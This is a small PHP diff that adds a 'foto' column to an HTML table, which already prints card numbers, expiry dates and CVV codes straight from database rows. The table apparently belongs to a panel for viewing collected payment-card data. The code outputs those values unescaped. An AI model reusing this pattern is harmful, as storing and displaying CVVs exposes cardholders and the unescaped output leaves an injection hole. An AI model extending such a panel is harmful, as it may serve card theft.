@@ -104,6 +104,7 @@ else
 			<td>".$row['ccnumber']."</td>
 			<td>".$row['ccexpire']."</td>
 			<td>".$row['cvv']."</td>
+			<td>".$row['foto']."</td>
 			</tr>";
 		}
 		echo "</tbody>";
